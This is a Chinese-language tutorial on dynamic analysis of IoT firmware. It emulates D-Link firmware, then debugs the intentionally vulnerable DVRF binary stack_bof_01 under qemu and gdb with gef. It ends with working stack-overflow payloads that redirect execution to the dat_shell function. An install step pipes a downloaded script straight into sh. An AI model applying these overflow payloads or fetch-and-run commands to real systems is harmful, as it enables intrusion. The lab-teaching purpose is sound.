# 动态分析 IoT 固件

动态分析固件之前，需要先把固件运行起来，但我们手头又没有路由器、摄像头之类的物联网硬件，该如何运行呢？这就需要虚拟执行，虚拟执行你就把它想象成一个虚拟机可以运行各种物联网OS就是了。虚拟执行IoT固件需要用到firmadyne工具，该工具很难安装，在kali上安装一直报错，你们可以尝试下，反正我是放弃了，最终还是乖乖地用attifyti提供的物联网渗透专用虚拟机，下载下来的文件直接用vmware导入就行了。
https://www.dropbox.com/sh/xrfzyp1ex2uii53/AAAF0mdA1qFaEBDYZoIxaQRma?dl=0
![1](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/1.png)

该系统为ubuntu14，密码为password@123，下面我们来演示虚拟执行一个dlink固件。
![2](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/2.png)

在tools/fat路径下运行fat.py，输入固件路径DWP2360b-firmware-v206-rc018.bin，然后是固件的品牌dlink，依次输入数据库密码firmadyne和用户密码password@123。
```
python fat.py
```
![3](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/3.png)

脚本执行成功后，会回显一个IP地址，这个IP就是模拟的固件地址。
![4](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/4.png)

以上只是简单地演示如何虚拟执行一个固件，下面我们就来实操如何通过动态调试分析一个固件，接下来的固件采用DVRF，这是个网友自制的充满漏洞的固件，供学习用的。
```
git clone https://github.com/praetorian-code/DVRF.git
```

开始之前，安装以下工具，动态调试中会用到。
```
sudo apt install gdb-multiarch
wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
sudo pip3 install capstone unicorn keystone-engine
```
安装keystone-engine时可能会报错，参考这个链接。
https://github.com/avatartwo/avatar2/issues/23

安装好工具后，就开始对固件进行分析啦，固件路径如下。
DVRF/Firmware/DVRF_v03.bin
使用binwalk提取固件文件系统。
```
binwalk -t -e DVRF_v03.bin
```
![5](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/5.png)

提取出来的系统有个文件夹pwnable，这个文件夹就是存放着有漏洞的程序示例，我们选取缓冲区漏洞程序stack_bof_01进行实验。首先使用readelf命令查看该程序的架构。
```
readelf -h pwnable/Intro/stack_bof_01
```
![6](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/6.png)

拷贝qemu-mipsel-static到当前目录，然后配合chroot虚拟执行stack_bof_01固件，可以成功执行。qemu是一款轻型的虚拟机。
```
cp $(which qemu-mipsel-static) .
sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01
```
![7](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/7.png)

查看stack_bof_01的源码，可以发现明显的strcpy内存溢出漏洞，当参数argv[1]超过200时，就会出现buf溢出的现象。
```
cat DVRF/Pwnable Source/Intro/stack_bof_01.c
```
![8](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/8.png)

以调试的方式启动stack_bof_01，在本地的1234端口监听调试。
```
sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01
```
![9](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/9.png)

运行以下命令开始调试。
```
gdb-multiarch pwnable/Intro/stack_bof_01
```
gdb运行后，会自动加载gef插件，然后设置固件架构为mips。
```
set architecture mips
```
设置完远程调试的IP和端口，就可开始调试stack_bof_01程序了。
```
target remote 127.0.0.1:1234
```
![10](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/10.png)

调用命令查看样本的所有函数，可以看到各个函数的地址。
```
info functions
```
![11](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/11.png)

如果你感兴趣，可以使用命令查反汇编看下main函数的汇编码，这是mips架构的汇编码，跟x86的相差很大，完全看不懂。。
```
disass main
```

![12](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/12.png)

然后我们使用命令创建一个随机的300字节流，作为攻击字符串，用于测试参数溢出的点。
```
pattern create 300
```
![13](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/13.png)


重新带参数调试stack_bof_01。
```
sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
```
![14](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/14.png)

gdb挂上去后，输入c回车让程序跑起来，会发现程序崩溃了，SIGSEGV内存出错，指针ra指向0x63616162，对应的ASCII是”baac”。

![15](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/15.png)


使用命令查看该溢出点在攻击字符串的什么位置，是位于pattern的第204位。
```
pattern search 0x63616162
```
![15](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/15.png)
然后反汇编dat_shell函数，查看其函数地址，我们的目的是要让程序本来执行0x63616162，变成执行dat_shell的地址，理论上应该把0x63616162改成0x400950，但书上说要略过前3条gp相关的指令，我也不知道为啥，有兴趣的同学google下吧。
```
disass dat_shell
```
![16](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/16.png)

将待执行的函数地址拼凑到204个字节后面，便可劫持程序执行流到dat_shell函数（0x40095C）,从而实现缓冲区溢出攻击。
```
sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 "$(python -c "print 'A'*204 + '\x5c\x09\x40'")"
```
![17](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/17.png)

最后，试了下0x400950确实不行，会报错。
```
sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 "$(python -c "print 'A'*204 + '\x50\x09\x40'")"
```
![18](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/03-动态分析IoT固件/18.png)
